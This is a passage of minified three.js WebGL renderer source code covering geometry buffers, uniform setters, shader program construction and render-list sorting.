null!==(t=a.get(r)).index&&e.remove(t.index),t.attributes)e.remove(t.attributes[s]);r.removeEventListener("dispose",n),a.delete(r),(s=o.get(t))&&(e.remove(s),o.delete(t)),i.memory.geometries--}function r(t){var i=[],n=t.index,r=t.attributes.position;if(null!==n){var a=n.array;n=n.version,r=0;for(var s=a.length;r<s;r+=3){var l=a[r+0],c=a[r+1],h=a[r+2];i.push(l,c,c,h,h,l)}}else for(a=r.array,n=r.version,r=0,s=a.length/3-1;r<s;r+=3)l=r+0,c=r+1,h=r+2,i.push(l,c,c,h,h,l);(i=new(65535<B(i)?z:O)(i,1)).version=n,e.update(i,34963),(a=o.get(t))&&e.remove(a),o.set(t,i)}var a=new WeakMap,o=new WeakMap;return{get:function(t,e){var r=a.get(e);return r||(e.addEventListener("dispose",n),e.isBufferGeometry?r=e:e.isGeometry&&(void 0===e._bufferGeometry&&(e._bufferGeometry=(new F).setFromObject(t)),r=e._bufferGeometry),a.set(e,r),i.memory.geometries++,r)},update:function(t){var i=t.index,n=t.attributes;for(var r in null!==i&&e.update(i,34963),n)e.update(n[r],34962);for(r in t=t.morphAttributes){n=0;for(var a=(i=t[r]).length;n<a;n++)e.update(i[n],34962)}},getWireframeAttribute:function(t){var e=o.get(t);if(e){var i=t.index;null!==i&&e.version<i.version&&r(t)}else r(t);return o.get(t)}}}function dt(t,e,i,n){var r,a,o;this.setMode=function(t){r=t},this.setIndex=function(t){a=t.type,o=t.bytesPerElement},this.render=function(e,n){t.drawElements(r,n,a,e*o),i.update(n,r)},this.renderInstances=function(s,l,c){if(n.isWebGL2)var h=t,u="drawElementsInstanced";else if(u="drawElementsInstancedANGLE",null===(h=e.get("ANGLE_instanced_arrays")))return void console.error("THREE.WebGLIndexedBufferRenderer: using THREE.InstancedBufferGeometry but hardware does not support extension ANGLE_instanced_arrays.");h[u](r,c,a,l*o,s.maxInstancedCount),i.update(c,r,s.maxInstancedCount)}}function pt(t){var e={frame:0,calls:0,triangles:0,points:0,lines:0};return{memory:{geometries:0,textures:0},render:e,programs:null,autoReset:!0,reset:function(){e.frame++,e.calls=0,e.triangles=0,e.points=0,e.lines=0},update:function(t,i,n){switch(n=n||1,e.calls++,i){case 4:e.triangles+=t/3*n;break;case 5:case 6:e.triangles+=n*(t-2);break;case 1:e.lines+=t/2*n;break;case 3:e.lines+=n*(t-1);break;case 2:e.lines+=n*t;break;case 0:e.points+=n*t;break;default:console.error("THREE.WebGLInfo: Unknown draw mode:",i)}}}}function ft(t,e){return Math.abs(e[1])-Math.abs(t[1])}function mt(t){var e={},i=new Float32Array(8);return{update:function(n,r,a,o){var s=n.morphTargetInfluences,l=s.length;if(void 0===(n=e[r.id])){n=[];for(var c=0;c<l;c++)n[c]=[c,0];e[r.id]=n}var h=a.morphTargets&&r.morphAttributes.position;for(a=a.morphNormals&&r.morphAttributes.normal,c=0;c<l;c++){var u=n[c];0!==u[1]&&(h&&r.removeAttribute("morphTarget"+c),a&&r.removeAttribute("morphNormal"+c))}for(c=0;c<l;c++)(u=n[c])[0]=c,u[1]=s[c];for(n.sort(ft),c=0;8>c;c++)(u=n[c])&&(s=u[0],l=u[1])?(h&&r.addAttribute("morphTarget"+c,h[s]),a&&r.addAttribute("morphNormal"+c,a[s]),i[c]=l):i[c]=0;o.getUniforms().setValue(t,"morphTargetInfluences",i)}}}function gt(t,e){var i={};return{update:function(n){var r=e.render.frame,a=n.geometry,o=t.get(n,a);return i[o.id]!==r&&(a.isGeometry&&o.updateFromObject(n),t.update(o),i[o.id]=r),o},dispose:function(){i={}}}}function vt(t,e,i,n,r,a,s,l,c,h){t=void 0!==t?t:[],o.call(this,t,void 0!==e?e:301,i,n,r,a,void 0!==s?s:1022,l,c,h),this.flipY=!1}function yt(t,e,i,n){o.call(this,null),this.image={data:t,width:e,height:i,depth:n},this.minFilter=this.magFilter=1003,this.wrapR=1001,this.flipY=this.generateMipmaps=!1}function xt(t,e,i,n){o.call(this,null),this.image={data:t,width:e,height:i,depth:n},this.minFilter=this.magFilter=1003,this.wrapR=1001,this.flipY=this.generateMipmaps=!1}function bt(t,e,i){var n=t[0];if(0>=n||0<n)return t;var r=e*i,a=Ss[r];if(void 0===a&&(a=new Float32Array(r),Ss[r]=a),0!==e)for(n.toArray(a,0),n=1,r=0;n!==e;++n)r+=i,t[n].toArray(a,r);return a}function wt(t,e){if(t.length!==e.length)return!1;for(var i=0,n=t.length;i<n;i++)if(t[i]!==e[i])return!1;return!0}function _t(t,e){for(var i=0,n=e.length;i<n;i++)t[i]=e[i]}function Mt(t,e){var i=Ts[e];void 0===i&&(i=new Int32Array(e),Ts[e]=i);for(var n=0;n!==e;++n)i[n]=t.allocateTextureUnit();return i}function St(t,e){var i=this.cache;i[0]!==e&&(t.uniform1f(this.addr,e),i[0]=e)}function Tt(t,e){var i=this.cache;void 0!==e.x?i[0]===e.x&&i[1]===e.y||(t.uniform2f(this.addr,e.x,e.y),i[0]=e.x,i[1]=e.y):wt(i,e)||(t.uniform2fv(this.addr,e),_t(i,e))}function Et(t,e){var i=this.cache;void 0!==e.x?i[0]===e.x&&i[1]===e.y&&i[2]===e.z||(t.uniform3f(this.addr,e.x,e.y,e.z),i[0]=e.x,i[1]=e.y,i[2]=e.z):void 0!==e.r?i[0]===e.r&&i[1]===e.g&&i[2]===e.b||(t.uniform3f(this.addr,e.r,e.g,e.b),i[0]=e.r,i[1]=e.g,i[2]=e.b):wt(i,e)||(t.uniform3fv(this.addr,e),_t(i,e))}function Ct(t,e){var i=this.cache;void 0!==e.x?i[0]===e.x&&i[1]===e.y&&i[2]===e.z&&i[3]===e.w||(t.uniform4f(this.addr,e.x,e.y,e.z,e.w),i[0]=e.x,i[1]=e.y,i[2]=e.z,i[3]=e.w):wt(i,e)||(t.uniform4fv(this.addr,e),_t(i,e))}function At(t,e){var i=this.cache,n=e.elements;void 0===n?wt(i,e)||(t.uniformMatrix2fv(this.addr,!1,e),_t(i,e)):wt(i,n)||(As.set(n),t.uniformMatrix2fv(this.addr,!1,As),_t(i,n))}function Lt(t,e){var i=this.cache,n=e.elements;void 0===n?wt(i,e)||(t.uniformMatrix3fv(this.addr,!1,e),_t(i,e)):wt(i,n)||(Cs.set(n),t.uniformMatrix3fv(this.addr,!1,Cs),_t(i,n))}function Pt(t,e){var i=this.cache,n=e.elements;void 0===n?wt(i,e)||(t.uniformMatrix4fv(this.addr,!1,e),_t(i,e)):wt(i,n)||(Es.set(n),t.uniformMatrix4fv(this.addr,!1,Es),_t(i,n))}function Rt(t,e,i){var n=this.cache,r=i.allocateTextureUnit();n[0]!==r&&(t.uniform1i(this.addr,r),n[0]=r),i.safeSetTexture2D(e||bs,r)}function Ot(t,e,i){var n=this.cache,r=i.allocateTextureUnit();n[0]!==r&&(t.uniform1i(this.addr,r),n[0]=r),i.setTexture2DArray(e||ws,r)}function It(t,e,i){var n=this.cache,r=i.allocateTextureUnit();n[0]!==r&&(t.uniform1i(this.addr,r),n[0]=r),i.setTexture3D(e||_s,r)}function zt(t,e,i){var n=this.cache,r=i.allocateTextureUnit();n[0]!==r&&(t.uniform1i(this.addr,r),n[0]=r),i.safeSetTextureCube(e||Ms,r)}function Dt(t,e){var i=this.cache;i[0]!==e&&(t.uniform1i(this.addr,e),i[0]=e)}function Nt(t,e){var i=this.cache;wt(i,e)||(t.uniform2iv(this.addr,e),_t(i,e))}function kt(t,e){var i=this.cache;wt(i,e)||(t.uniform3iv(this.addr,e),_t(i,e))}function Bt(t,e){var i=this.cache;wt(i,e)||(t.uniform4iv(this.addr,e),_t(i,e))}function Ft(t,e){t.uniform1fv(this.addr,e)}function Ht(t,e){t.uniform1iv(this.addr,e)}function Gt(t,e){t.uniform2iv(this.addr,e)}function jt(t,e){t.uniform3iv(this.addr,e)}function Ut(t,e){t.uniform4iv(this.addr,e)}function Vt(t,e){e=bt(e,this.size,2),t.uniform2fv(this.addr,e)}function Wt(t,e){e=bt(e,this.size,3),t.uniform3fv(this.addr,e)}function qt(t,e){e=bt(e,this.size,4),t.uniform4fv(this.addr,e)}function Xt(t,e){e=bt(e,this.size,4),t.uniformMatrix2fv(this.addr,!1,e)}function Yt(t,e){e=bt(e,this.size,9),t.uniformMatrix3fv(this.addr,!1,e)}function $t(t,e){e=bt(e,this.size,16),t.uniformMatrix4fv(this.addr,!1,e)}function Zt(t,e,i){var n=e.length,r=Mt(i,n);for(t.uniform1iv(this.addr,r),t=0;t!==n;++t)i.safeSetTexture2D(e[t]||bs,r[t])}function Jt(t,e,i){var n=e.length,r=Mt(i,n);for(t.uniform1iv(this.addr,r),t=0;t!==n;++t)i.safeSetTextureCube(e[t]||Ms,r[t])}function Kt(t,e,i){this.id=t,this.addr=i,this.cache=[],this.setValue=function(t){switch(t){case 5126:return St;case 35664:return Tt;case 35665:return Et;case 35666:return Ct;case 35674:return At;case 35675:return Lt;case 35676:return Pt;case 35678:case 36198:return Rt;case 35679:return It;case 35680:return zt;case 36289:return Ot;case 5124:case 35670:return Dt;case 35667:case 35671:return Nt;case 35668:case 35672:return kt;case 35669:case 35673:return Bt}}(e.type)}function Qt(t,e,i){this.id=t,this.addr=i,this.cache=[],this.size=e.size,this.setValue=function(t){switch(t){case 5126:return Ft;case 35664:return Vt;case 35665:return Wt;case 35666:return qt;case 35674:return Xt;case 35675:return Yt;case 35676:return $t;case 35678:return Zt;case 35680:return Jt;case 5124:case 35670:return Ht;case 35667:case 35671:return Gt;case 35668:case 35672:return jt;case 35669:case 35673:return Ut}}(e.type)}function te(t){this.id=t,this.seq=[],this.map={}}function ee(t,e){this.seq=[],this.map={};for(var i=t.getProgramParameter(e,35718),n=0;n<i;++n){var r=t.getActiveUniform(e,n),a=t.getUniformLocation(e,r.name),o=this,s=r.name,l=s.length;for(Ls.lastIndex=0;;){var c=Ls.exec(s),h=Ls.lastIndex,u=c[1],d=c[3];if("]"===c[2]&&(u|=0),void 0===d||"["===d&&h+2===l){s=o,r=void 0===d?new Kt(u,r,a):new Qt(u,r,a),s.seq.push(r),s.map[r.id]=r;break}void 0===(d=o.map[u])&&(d=new te(u),u=o,o=d,u.seq.push(o),u.map[o.id]=o),o=d}}}function ie(t,e,i){return e=t.createShader(e),t.shaderSource(e,i),t.compileShader(e),e}function ne(t){switch(t){case 3e3:return["Linear","( value )"];case 3001:return["sRGB","( value )"];case 3002:return["RGBE","( value )"];case 3004:return["RGBM","( value, 7.0 )"];case 3005:return["RGBM","( value, 16.0 )"];case 3006:return["RGBD","( value, 256.0 )"];case 3007:return["Gamma","( value, float( GAMMA_FACTOR ) )"];case 3003:return["LogLuv","( value )"];default:throw Error("unsupported encoding: "+t)}}function re(t,e,i){var n=t.getShaderParameter(e,35713),r=t.getShaderInfoLog(e).trim();if(n&&""===r)return"";for(t=t.getShaderSource(e).split("\n"),e=0;e<t.length;e++)t[e]=e+1+": "+t[e];return"THREE.WebGLShader: gl.getShaderInfoLog() "+i+"\n"+r+(t=t.join("\n"))}function ae(t,e){return"vec4 "+t+"( vec4 value ) { return "+(e=ne(e))[0]+"ToLinear"+e[1]+"; }"}function oe(t,e){return"vec4 "+t+"( vec4 value ) { return LinearTo"+(e=ne(e))[0]+e[1]+"; }"}function se(t,e){switch(e){case 1:e="Linear";break;case 2:e="Reinhard";break;case 3:e="Uncharted2";break;case 4:e="OptimizedCineon";break;case 5:e="ACESFilmic";break;default:throw Error("unsupported toneMapping: "+e)}return"vec3 "+t+"( vec3 color ) { return "+e+"ToneMapping( color ); }"}function le(t){return""!==t}function ce(t,e){return t.replace(/NUM_DIR_LIGHTS/g,e.numDirLights).replace(/NUM_SPOT_LIGHTS/g,e.numSpotLights).replace(/NUM_RECT_AREA_LIGHTS/g,e.numRectAreaLights).replace(/NUM_POINT_LIGHTS/g,e.numPointLights).replace(/NUM_HEMI_LIGHTS/g,e.numHemiLights).replace(/NUM_DIR_LIGHT_SHADOWS/g,e.numDirLightShadows).replace(/NUM_SPOT_LIGHT_SHADOWS/g,e.numSpotLightShadows).replace(/NUM_POINT_LIGHT_SHADOWS/g,e.numPointLightShadows)}function he(t,e){return t.replace(/NUM_CLIPPING_PLANES/g,e.numClippingPlanes).replace(/UNION_CLIPPING_PLANES/g,e.numClippingPlanes-e.numClipIntersection)}function ue(t){return t.replace(/^[ \t]*#include +<([\w\d./]+)>/gm,(function(t,e){if(void 0===(t=vs[e]))throw Error("Can not resolve #include <"+e+">");return ue(t)}))}function de(t){return t.replace(/#pragma unroll_loop[\s]+?for \( int i = (\d+); i < (\d+); i \+\+ \) \{([\s\S]+?)(?=\})\}/g,(function(t,e,i,n){for(t="",e=parseInt(e);e<parseInt(i);e++)t+=n.replace(/\[ i \]/g,"[ "+e+" ]").replace(/UNROLLED_LOOP_INDEX/g,e);return t}))}function pe(t,e,i,n,r,a,o){var s=t.getContext(),l=n.defines,c=r.vertexShader,h=r.fragmentShader,u="SHADOWMAP_TYPE_BASIC";1===a.shadowMapType?u="SHADOWMAP_TYPE_PCF":2===a.shadowMapType?u="SHADOWMAP_TYPE_PCF_SOFT":3===a.shadowMapType&&(u="SHADOWMAP_TYPE_VSM");var d="ENVMAP_TYPE_CUBE",p="ENVMAP_MODE_REFLECTION",f="ENVMAP_BLENDING_MULTIPLY";if(a.envMap){switch(n.envMap.mapping){case 301:case 302:d="ENVMAP_TYPE_CUBE";break;case 306:case 307:d="ENVMAP_TYPE_CUBE_UV";break;case 303:case 304:d="ENVMAP_TYPE_EQUIREC";break;case 305:d="ENVMAP_TYPE_SPHERE"}switch(n.envMap.mapping){case 302:case 304:p="ENVMAP_MODE_REFRACTION"}switch(n.combine){case 0:f="ENVMAP_BLENDING_MULTIPLY";break;case 1:f="ENVMAP_BLENDING_MIX";break;case 2:f="ENVMAP_BLENDING_ADD"}}var m,g,v=0<t.gammaFactor?t.gammaFactor:1,y=o.isWebGL2?"":function(t,e,i){return[(t=t||{}).derivatives||e.envMapCubeUV||e.bumpMap||e.tangentSpaceNormalMap||e.clearcoatNormalMap||e.flatShading?"#extension GL_OES_standard_derivatives : enable":"",(t.fragDepth||e.logarithmicDepthBuffer)&&i.get("EXT_frag_depth")?"#extension GL_EXT_frag_depth : enable":"",t.drawBuffers&&i.get("WEBGL_draw_buffers")?"#extension GL_EXT_draw_buffers : require":"",(t.shaderTextureLOD||e.envMap)&&i.get("EXT_shader_texture_lod")?"#extension GL_EXT_shader_texture_lod : enable":""].filter(le).join("\n")}(n.extensions,a,e),x=function(t){var e,i=[];for(e in t){var n=t[e];!1!==n&&i.push("#define "+e+" "+n)}return i.join("\n")}(l),b=s.createProgram();return n.isRawShaderMaterial?(0<(l=[x].filter(le).join("\n")).length&&(l+="\n"),0<(e=[y,x].filter(le).join("\n")).length&&(e+="\n")):(l=["precision "+a.precision+" float;","precision "+a.precision+" int;","highp"===a.precision?"#define HIGH_PRECISION":"","#define SHADER_NAME "+r.name,x,a.supportsVertexTextures?"#define VERTEX_TEXTURES":"","#define GAMMA_FACTOR "+v,"#define MAX_BONES "+a.maxBones,a.useFog&&a.fog?"#define USE_FOG":"",a.useFog&&a.fogExp2?"#define FOG_EXP2":"",a.map?"#define USE_MAP":"",a.envMap?"#define USE_ENVMAP":"",a.envMap?"#define "+p:"",a.lightMap?"#define USE_LIGHTMAP":"",a.aoMap?"#define USE_AOMAP":"",a.emissiveMap?"#define USE_EMISSIVEMAP":"",a.bumpMap?"#define USE_BUMPMAP":"",a.normalMap?"#define USE_NORMALMAP":"",a.normalMap&&a.objectSpaceNormalMap?"#define OBJECTSPACE_NORMALMAP":"",a.normalMap&&a.tangentSpaceNormalMap?"#define TANGENTSPACE_NORMALMAP":"",a.clearcoatNormalMap?"#define USE_CLEARCOAT_NORMALMAP":"",a.displacementMap&&a.supportsVertexTextures?"#define USE_DISPLACEMENTMAP":"",a.specularMap?"#define USE_SPECULARMAP":"",a.roughnessMap?"#define USE_ROUGHNESSMAP":"",a.metalnessMap?"#define USE_METALNESSMAP":"",a.alphaMap?"#define USE_ALPHAMAP":"",a.vertexTangents?"#define USE_TANGENT":"",a.vertexColors?"#define USE_COLOR":"",a.vertexUvs?"#define USE_UV":"",a.flatShading?"#define FLAT_SHADED":"",a.skinning?"#define USE_SKINNING":"",a.useVertexTexture?"#define BONE_TEXTURE":"",a.morphTargets?"#define USE_MORPHTARGETS":"",a.morphNormals&&!1===a.flatShading?"#define USE_MORPHNORMALS":"",a.doubleSided?"#define DOUBLE_SIDED":"",a.flipSided?"#define FLIP_SIDED":"",a.shadowMapEnabled?"#define USE_SHADOWMAP":"",a.shadowMapEnabled?"#define "+u:"",a.sizeAttenuation?"#define USE_SIZEATTENUATION":"",a.logarithmicDepthBuffer?"#define USE_LOGDEPTHBUF":"",a.logarithmicDepthBuffer&&(o.isWebGL2||e.get("EXT_frag_depth"))?"#define USE_LOGDEPTHBUF_EXT":"","uniform mat4 modelMatrix;","uniform mat4 modelViewMatrix;","uniform mat4 projectionMatrix;","uniform mat4 viewMatrix;","uniform mat3 normalMatrix;","uniform vec3 cameraPosition;","attribute vec3 position;","attribute vec3 normal;","attribute vec2 uv;","#ifdef USE_TANGENT","\tattribute vec4 tangent;","#endif","#ifdef USE_COLOR","\tattribute vec3 color;","#endif","#ifdef USE_MORPHTARGETS","\tattribute vec3 morphTarget0;","\tattribute vec3 morphTarget1;","\tattribute vec3 morphTarget2;","\tattribute vec3 morphTarget3;","\t#ifdef USE_MORPHNORMALS","\t\tattribute vec3 morphNormal0;","\t\tattribute vec3 morphNormal1;","\t\tattribute vec3 morphNormal2;","\t\tattribute vec3 morphNormal3;","\t#else","\t\tattribute vec3 morphTarget4;","\t\tattribute vec3 morphTarget5;","\t\tattribute vec3 morphTarget6;","\t\tattribute vec3 morphTarget7;","\t#endif","#endif","#ifdef USE_SKINNING","\tattribute vec4 skinIndex;","\tattribute vec4 skinWeight;","#endif","\n"].filter(le).join("\n"),e=[y,"precision "+a.precision+" float;","precision "+a.precision+" int;","highp"===a.precision?"#define HIGH_PRECISION":"","#define SHADER_NAME "+r.name,x,a.alphaTest?"#define ALPHATEST "+a.alphaTest+(a.alphaTest%1?"":".0"):"","#define GAMMA_FACTOR "+v,a.useFog&&a.fog?"#define USE_FOG":"",a.useFog&&a.fogExp2?"#define FOG_EXP2":"",a.map?"#define USE_MAP":"",a.matcap?"#define USE_MATCAP":"",a.envMap?"#define USE_ENVMAP":"",a.envMap?"#define "+d:"",a.envMap?"#define "+p:"",a.envMap?"#define "+f:"",a.lightMap?"#define USE_LIGHTMAP":"",a.aoMap?"#define USE_AOMAP":"",a.emissiveMap?"#define USE_EMISSIVEMAP":"",a.bumpMap?"#define USE_BUMPMAP":"",a.normalMap?"#define USE_NORMALMAP":"",a.normalMap&&a.objectSpaceNormalMap?"#define OBJECTSPACE_NORMALMAP":"",a.normalMap&&a.tangentSpaceNormalMap?"#define TANGENTSPACE_NORMALMAP":"",a.clearcoatNormalMap?"#define USE_CLEARCOAT_NORMALMAP":"",a.specularMap?"#define USE_SPECULARMAP":"",a.roughnessMap?"#define USE_ROUGHNESSMAP":"",a.metalnessMap?"#define USE_METALNESSMAP":"",a.alphaMap?"#define USE_ALPHAMAP":"",a.sheen?"#define USE_SHEEN":"",a.vertexTangents?"#define USE_TANGENT":"",a.vertexColors?"#define USE_COLOR":"",a.vertexUvs?"#define USE_UV":"",a.gradientMap?"#define USE_GRADIENTMAP":"",a.flatShading?"#define FLAT_SHADED":"",a.doubleSided?"#define DOUBLE_SIDED":"",a.flipSided?"#define FLIP_SIDED":"",a.shadowMapEnabled?"#define USE_SHADOWMAP":"",a.shadowMapEnabled?"#define "+u:"",a.premultipliedAlpha?"#define PREMULTIPLIED_ALPHA":"",a.physicallyCorrectLights?"#define PHYSICALLY_CORRECT_LIGHTS":"",a.logarithmicDepthBuffer?"#define USE_LOGDEPTHBUF":"",a.logarithmicDepthBuffer&&(o.isWebGL2||e.get("EXT_frag_depth"))?"#define USE_LOGDEPTHBUF_EXT":"",(n.extensions&&n.extensions.shaderTextureLOD||a.envMap)&&(o.isWebGL2||e.get("EXT_shader_texture_lod"))?"#define TEXTURE_LOD_EXT":"","uniform mat4 viewMatrix;","uniform vec3 cameraPosition;",0!==a.toneMapping?"#define TONE_MAPPING":"",0!==a.toneMapping?vs.tonemapping_pars_fragment:"",0!==a.toneMapping?se("toneMapping",a.toneMapping):"",a.dithering?"#define DITHERING":"",a.outputEncoding||a.mapEncoding||a.matcapEncoding||a.envMapEncoding||a.emissiveMapEncoding?vs.encodings_pars_fragment:"",a.mapEncoding?ae("mapTexelToLinear",a.mapEncoding):"",a.matcapEncoding?ae("matcapTexelToLinear",a.matcapEncoding):"",a.envMapEncoding?ae("envMapTexelToLinear",a.envMapEncoding):"",a.emissiveMapEncoding?ae("emissiveMapTexelToLinear",a.emissiveMapEncoding):"",a.outputEncoding?oe("linearToOutputTexel",a.outputEncoding):"",a.depthPacking?"#define DEPTH_PACKING "+n.depthPacking:"","\n"].filter(le).join("\n")),c=he(c=ce(c=ue(c),a),a),h=he(h=ce(h=ue(h),a),a),c=de(c),h=de(h),o.isWebGL2&&!n.isRawShaderMaterial&&(o=!1,u=/^\s*#version\s+300\s+es\s*\n/,n.isShaderMaterial&&null!==c.match(u)&&null!==h.match(u)&&(o=!0,c=c.replace(u,""),h=h.replace(u,"")),l="#version 300 es\n\n#define attribute in\n#define varying out\n#define texture2D texture\n"+l,e=["#version 300 es\n\n#define varying in",o?"":"out highp vec4 pc_fragColor;",o?"":"#define gl_FragColor pc_fragColor","#define gl_FragDepthEXT gl_FragDepth\n#define texture2D texture\n#define textureCube texture\n#define texture2DProj textureProj\n#define texture2DLodEXT textureLod\n#define texture2DProjLodEXT textureProjLod\n#define textureCubeLodEXT textureLod\n#define texture2DGradEXT textureGrad\n#define texture2DProjGradEXT textureProjGrad\n#define textureCubeGradEXT textureGrad"].join("\n")+"\n"+e),h=e+h,c=ie(s,35633,l+c),h=ie(s,35632,h),s.attachShader(b,c),s.attachShader(b,h),void 0!==n.index0AttributeName?s.bindAttribLocation(b,0,n.index0AttributeName):!0===a.morphTargets&&s.bindAttribLocation(b,0,"position"),s.linkProgram(b),t.debug.checkShaderErrors&&(t=s.getProgramInfoLog(b).trim(),a=s.getShaderInfoLog(c).trim(),o=s.getShaderInfoLog(h).trim(),d=u=!0,!1===s.getProgramParameter(b,35714)?(u=!1,p=re(s,c,"vertex"),f=re(s,h,"fragment"),console.error("THREE.WebGLProgram: shader error: ",s.getError(),"35715",s.getProgramParameter(b,35715),"gl.getProgramInfoLog",t,p,f)):""!==t?console.warn("THREE.WebGLProgram: gl.getProgramInfoLog()",t):""!==a&&""!==o||(d=!1),d&&(this.diagnostics={runnable:u,material:n,programLog:t,vertexShader:{log:a,prefix:l},fragmentShader:{log:o,prefix:e}})),s.deleteShader(c),s.deleteShader(h),this.getUniforms=function(){return void 0===m&&(m=new ee(s,b)),m},this.getAttributes=function(){if(void 0===g){for(var t={},e=s.getProgramParameter(b,35721),i=0;i<e;i++){var n=s.getActiveAttrib(b,i).name;t[n]=s.getAttribLocation(b,n)}g=t}return g},this.destroy=function(){s.deleteProgram(b),this.program=void 0},this.name=r.name,this.id=Ps++,this.code=i,this.usedTimes=1,this.program=b,this.vertexShader=c,this.fragmentShader=h,this}function fe(t,e,i){function n(t,e){if(t)t.isTexture?i=t.encoding:t.isWebGLRenderTarget&&(console.warn("THREE.WebGLPrograms.getTextureEncodingFromMap: don't use render targets as textures. Use their .texture property instead."),i=t.texture.encoding);else var i=3e3;return 3e3===i&&e&&(i=3007),i}var r=[],a={MeshDepthMaterial:"depth",MeshDistanceMaterial:"distanceRGBA",MeshNormalMaterial:"normal",MeshBasicMaterial:"basic",MeshLambertMaterial:"lambert",MeshPhongMaterial:"phong",MeshToonMaterial:"phong",MeshStandardMaterial:"physical",MeshPhysicalMaterial:"physical",MeshMatcapMaterial:"matcap",LineBasicMaterial:"basic",LineDashedMaterial:"dashed",PointsMaterial:"points",ShadowMaterial:"shadow",SpriteMaterial:"sprite"},o="precision supportsVertexTextures map mapEncoding matcap matcapEncoding envMap envMapMode envMapEncoding lightMap aoMap emissiveMap emissiveMapEncoding bumpMap normalMap objectSpaceNormalMap tangentSpaceNormalMap clearcoatNormalMap displacementMap specularMap roughnessMap metalnessMap gradientMap alphaMap combine vertexColors vertexTangents fog useFog fogExp2 flatShading sizeAttenuation logarithmicDepthBuffer skinning maxBones useVertexTexture morphTargets morphNormals maxMorphTargets maxMorphNormals premultipliedAlpha numDirLights numPointLights numSpotLights numHemiLights numRectAreaLights shadowMapEnabled shadowMapType toneMapping physicallyCorrectLights alphaTest doubleSided flipSided numClippingPlanes numClipIntersection depthPacking dithering sheen".split(" ");this.getParameters=function(e,r,o,s,l,c,h){var u=a[e.type];if(h.isSkinnedMesh){var d=h.skeleton.bones;if(i.floatVertexTextures)d=1024;else{var p=Math.min(Math.floor((i.maxVertexUniforms-20)/4),d.length);p<d.length?(console.warn("THREE.WebGLRenderer: Skeleton has "+d.length+" bones. This GPU supports "+p+"."),d=0):d=p}}else d=0;p=i.precision,null!==e.precision&&((p=i.getMaxPrecision(e.precision))!==e.precision&&console.warn("THREE.WebGLProgram.getParameters:",e.precision,"not supported, using",p,"instead."));var f=t.getRenderTarget();return{shaderID:u,precision:p,supportsVertexTextures:i.vertexTextures,outputEncoding:n(f?f.texture:null,t.gammaOutput),map:!!e.map,mapEncoding:n(e.map,t.gammaInput),matcap:!!e.matcap,matcapEncoding:n(e.matcap,t.gammaInput),envMap:!!e.envMap,envMapMode:e.envMap&&e.envMap.mapping,envMapEncoding:n(e.envMap,t.gammaInput),envMapCubeUV:!!e.envMap&&(306===e.envMap.mapping||307===e.envMap.mapping),lightMap:!!e.lightMap,aoMap:!!e.aoMap,emissiveMap:!!e.emissiveMap,emissiveMapEncoding:n(e.emissiveMap,t.gammaInput),bumpMap:!!e.bumpMap,normalMap:!!e.normalMap,objectSpaceNormalMap:1===e.normalMapType,tangentSpaceNormalMap:0===e.normalMapType,clearcoatNormalMap:!!e.clearcoatNormalMap,displacementMap:!!e.displacementMap,roughnessMap:!!e.roughnessMap,metalnessMap:!!e.metalnessMap,specularMap:!!e.specularMap,alphaMap:!!e.alphaMap,gradientMap:!!e.gradientMap,sheen:!!e.sheen,combine:e.combine,vertexTangents:e.normalMap&&e.vertexTangents,vertexColors:e.vertexColors,vertexUvs:!!(e.map||e.bumpMap||e.normalMap||e.specularMap||e.alphaMap||e.emissiveMap||e.roughnessMap||e.metalnessMap||e.clearcoatNormalMap),fog:!!s,useFog:e.fog,fogExp2:s&&s.isFogExp2,flatShading:e.flatShading,sizeAttenuation:e.sizeAttenuation,logarithmicDepthBuffer:i.logarithmicDepthBuffer,skinning:e.skinning&&0<d,maxBones:d,useVertexTexture:i.floatVertexTextures,morphTargets:e.morphTargets,morphNormals:e.morphNormals,maxMorphTargets:t.maxMorphTargets,maxMorphNormals:t.maxMorphNormals,numDirLights:r.directional.length,numPointLights:r.point.length,numSpotLights:r.spot.length,numRectAreaLights:r.rectArea.length,numHemiLights:r.hemi.length,numDirLightShadows:r.directionalShadowMap.length,numPointLightShadows:r.pointShadowMap.length,numSpotLightShadows:r.spotShadowMap.length,numClippingPlanes:l,numClipIntersection:c,dithering:e.dithering,shadowMapEnabled:t.shadowMap.enabled&&h.receiveShadow&&0<o.length,shadowMapType:t.shadowMap.type,toneMapping:e.toneMapped?t.toneMapping:0,physicallyCorrectLights:t.physicallyCorrectLights,premultipliedAlpha:e.premultipliedAlpha,alphaTest:e.alphaTest,doubleSided:2===e.side,flipSided:1===e.side,depthPacking:void 0!==e.depthPacking&&e.depthPacking}},this.getProgramCode=function(e,i){var n=[];if(i.shaderID?n.push(i.shaderID):(n.push(e.fragmentShader),n.push(e.vertexShader)),void 0!==e.defines)for(var r in e.defines)n.push(r),n.push(e.defines[r]);for(r=0;r<o.length;r++)n.push(i[o[r]]);return n.push(e.onBeforeCompile.toString()),n.push(t.gammaOutput),n.push(t.gammaFactor),n.join()},this.acquireProgram=function(n,a,o,s){for(var l,c=0,h=r.length;c<h;c++){var u=r[c];if(u.code===s){++(l=u).usedTimes;break}}return void 0===l&&(l=new pe(t,e,s,n,a,o,i),r.push(l)),l},this.releaseProgram=function(t){if(0==--t.usedTimes){var e=r.indexOf(t);r[e]=r[r.length-1],r.pop(),t.destroy()}},this.programs=r}function me(){var t=new WeakMap;return{get:function(e){var i=t.get(e);return void 0===i&&(i={},t.set(e,i)),i},remove:function(e){t.delete(e)},update:function(e,i,n){t.get(e)[i]=n},dispose:function(){t=new WeakMap}}}function ge(t,e){return t.groupOrder!==e.groupOrder?t.groupOrder-e.groupOrder:t.renderOrder!==e.renderOrder?t.renderOrder-e.renderOrder:t.program!==e.program?t.program.id-e.program.id:t.material.id!==e.material.id?t.material.id-e.material.id:t.z!==e.z?t.z-e.z:t.id-e.id}function ve(t,e){return t.groupOrder!==e.groupOrder?t.groupOrder-e.groupOrder:t.renderOrder!==e.renderOrder?t.renderOrder-e.renderOrder:t.z!==e.z?e.z-t.z:t.id-e.id}function ye(){function t(t,n,r,o,s,l){var c=e[i];return void 0===c?(c={id:t.id,object:t,geometry:n,material:r,program:r.program||a,groupOrder:o,renderOrder:t.renderOrder,z:s,group:l},e[i]=c):(c.id=t.id,c.object=t,c.geometry=n,c.material=r,c.program=r.program||a,c.groupOrder=o,c.renderOrder=t.renderOrder,c.z=s,c.group=l),i++,c}var 